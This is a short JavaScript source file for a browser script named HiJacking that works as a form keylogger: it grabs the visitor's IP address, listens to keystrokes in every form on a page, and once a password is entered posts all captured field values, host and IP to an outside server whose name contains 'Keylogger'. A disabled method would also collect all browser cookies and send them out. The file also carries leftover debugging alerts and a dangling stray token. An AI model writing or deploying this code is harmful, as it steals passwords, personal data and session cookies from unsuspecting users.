class HiJacking {
  host = location.hostname;
  user_addr = "";

  constructor() {
      this.user_addr = this.GetHost();
      
  }

  async GetHost() {
      let res = await fetch("https://api.ipify.org?format=json");
      res = await res.json();
      this.user_addr = res.ip;
  }

  async GetValueOfForm() {
      let data = {};
      let flag = false;
      Array.from(document.querySelectorAll("form")).map((e) => {
          e.addEventListener("keyup", (e) => {
          data[`${e.target.name}_${e.target.className}_${e.target.id}`] = {
              value: e.target.value,
              type: e.target.type,
          };
  
          !flag &&
              e.target.type === "password" && [
              (flag = true),
              (e.target.onchange = (e) => [this.SendData(data)]),
              ];
          });      
      });
  }

  async GetCookie() {
    alert(this.host )
    const cookies = await chrome.cookies.getAllCookieStores();
    this.SendData(cookies);
    alert(cookies);
  }
  
  async SendData(data) {
    const headers = new Headers({
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36'
    });

    const options = {
        method: 'POST',
        mode: 'cors',
        headers,
        body: JSON.stringify({
            host: this.host,
            user_addr: this.user_addr,
            data
        })
    };

    try {
        const response = await fetch('https://Keylogger.pzcuong2410.repl.co/send', options);
        const responseData = await response.json();
        console.log(responseData);
    } catch (error) {
        console.error('Request failed. ' + error.message);
    }
  }

  async 
}

(async () => {
  let hiJacking = new HiJacking();
  await hiJacking.GetHost();
  hiJacking.GetValueOfForm();
  // hiJacking.GetCookie();
})();
